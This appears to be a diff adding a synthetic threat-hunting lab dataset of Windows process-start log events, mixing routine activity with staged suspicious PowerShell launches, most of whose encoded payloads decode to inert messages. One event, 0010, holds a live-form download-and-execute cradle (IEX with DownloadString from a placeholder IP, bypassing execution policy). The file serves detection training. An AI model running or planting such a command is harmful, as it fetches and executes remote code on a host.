@@ -1,0 +1,450 @@
+[
+  {
+    "@timestamp": "2026-01-15T08:01:12.000Z",
+    "event": {
+      "id": "thl-evt-0001",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-FIN-01"
+    },
+    "user": {
+      "name": "user.fin01"
+    },
+    "process": {
+      "name": "notepad.exe",
+      "executable": "C:\\Windows\\System32\\notepad.exe",
+      "command_line": "\"C:\\Windows\\System32\\notepad.exe\" C:\\Users\\user.fin01\\Documents\\notes.txt",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "C:\\Windows\\Explorer.EXE"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:03:45.000Z",
+    "event": {
+      "id": "thl-evt-0002",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-FIN-01"
+    },
+    "user": {
+      "name": "user.fin01"
+    },
+    "process": {
+      "name": "msedge.exe",
+      "executable": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+      "command_line": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --single-argument https://intranet.example.com/",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "C:\\Windows\\Explorer.EXE"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:05:00.000Z",
+    "event": {
+      "id": "thl-evt-0003",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "SRV-APP-01"
+    },
+    "user": {
+      "name": "SYSTEM"
+    },
+    "process": {
+      "name": "svchost.exe",
+      "executable": "C:\\Windows\\System32\\svchost.exe",
+      "command_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
+      "parent": {
+        "name": "services.exe",
+        "command_line": "C:\\Windows\\system32\\services.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:10:30.000Z",
+    "event": {
+      "id": "thl-evt-0004",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-ENG-02"
+    },
+    "user": {
+      "name": "user.eng02"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "C:\\Windows\\Explorer.EXE"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:12:02.000Z",
+    "event": {
+      "id": "thl-evt-0005",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-ENG-02"
+    },
+    "user": {
+      "name": "user.eng02"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoLogo",
+      "parent": {
+        "name": "Code.exe",
+        "command_line": "\"C:\\Users\\user.eng02\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\""
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:15:00.000Z",
+    "event": {
+      "id": "thl-evt-0006",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "SRV-APP-01"
+    },
+    "user": {
+      "name": "svc_monitoring"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File \"C:\\Scripts\\Get-DiskReport.ps1\"",
+      "parent": {
+        "name": "svchost.exe",
+        "command_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:20:15.000Z",
+    "event": {
+      "id": "thl-evt-0007",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-ENG-02"
+    },
+    "user": {
+      "name": "user.eng02"
+    },
+    "process": {
+      "name": "ipconfig.exe",
+      "executable": "C:\\Windows\\System32\\ipconfig.exe",
+      "command_line": "ipconfig /all",
+      "parent": {
+        "name": "cmd.exe",
+        "command_line": "C:\\Windows\\system32\\cmd.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:22:40.000Z",
+    "event": {
+      "id": "thl-evt-0008",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-HR-03"
+    },
+    "user": {
+      "name": "user.hr03"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command \"Get-Content C:\\Reports\\q4-encryption-audit.txt\"",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "C:\\Windows\\Explorer.EXE"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:30:05.000Z",
+    "event": {
+      "id": "thl-evt-0009",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-FIN-01"
+    },
+    "user": {
+      "name": "user.fin01"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAZQB2AGUAbgB0ACAALQAgAGkAbgBlAHIAdAAnAA==",
+      "parent": {
+        "name": "WINWORD.EXE",
+        "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\user.fin01\\Downloads\\invoice_0423.docm\""
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:31:10.000Z",
+    "event": {
+      "id": "thl-evt-0010",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-HR-03"
+    },
+    "user": {
+      "name": "user.hr03"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')\"",
+      "parent": {
+        "name": "cmd.exe",
+        "command_line": "C:\\Windows\\system32\\cmd.exe /c \"C:\\Users\\user.hr03\\AppData\\Local\\Temp\\start.bat\""
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:40:00.000Z",
+    "event": {
+      "id": "thl-evt-0011",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "SRV-APP-01"
+    },
+    "user": {
+      "name": "svc_deploy"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -NonInteractive -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAYQBkAG0AaQBuACAAdABhAHMAawAgAC0AIABpAG4AZQByAHQAJwA=",
+      "parent": {
+        "name": "deployagent.exe",
+        "command_line": "\"C:\\Program Files\\ExampleCorp\\DeployAgent\\deployagent.exe\" --run-job 1187"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:45:30.000Z",
+    "event": {
+      "id": "thl-evt-0012",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-ENG-02"
+    },
+    "user": {
+      "name": "user.eng02"
+    },
+    "process": {
+      "name": "POWERSHELL.EXE",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\POWERSHELL.EXE",
+      "command_line": "POWERSHELL.EXE -NoP -W Hidden -eNc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+      "parent": {
+        "name": "cmd.exe",
+        "command_line": "C:\\Windows\\system32\\cmd.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:50:12.000Z",
+    "event": {
+      "id": "thl-evt-0013",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-FIN-01"
+    },
+    "user": {
+      "name": "user.fin01"
+    },
+    "process": {
+      "name": "pwsh.exe",
+      "executable": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+      "command_line": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAcAB3AHMAaAAgAGUAdgBlAG4AdAAgAC0AIABpAG4AZQByAHQAJwA=",
+      "parent": {
+        "name": "EXCEL.EXE",
+        "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /dde"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T08:55:00.000Z",
+    "event": {
+      "id": "thl-evt-0014",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-HR-03"
+    },
+    "user": {
+      "name": "user.hr03"
+    },
+    "process": {
+      "name": "powershell_ise.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
+      "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe\"",
+      "parent": {
+        "name": "explorer.exe",
+        "command_line": "C:\\Windows\\Explorer.EXE"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T09:00:00.000Z",
+    "event": {
+      "id": "thl-evt-0015",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "SRV-APP-01"
+    },
+    "user": {
+      "name": "SYSTEM"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Scripts\\Rotate-Logs.ps1",
+      "parent": {
+        "name": "svchost.exe",
+        "command_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-01-15T09:05:20.000Z",
+    "event": {
+      "id": "thl-evt-0016",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "WKS-HR-03"
+    },
+    "user": {
+      "name": "user.hr03"
+    },
+    "process": {
+      "name": "svcupdate.exe",
+      "executable": "C:\\Users\\Public\\svcupdate.exe",
+      "command_line": "svcupdate.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+      "parent": {
+        "name": "cmd.exe",
+        "command_line": "C:\\Windows\\system32\\cmd.exe"
+      }
+    }
+  }
+]
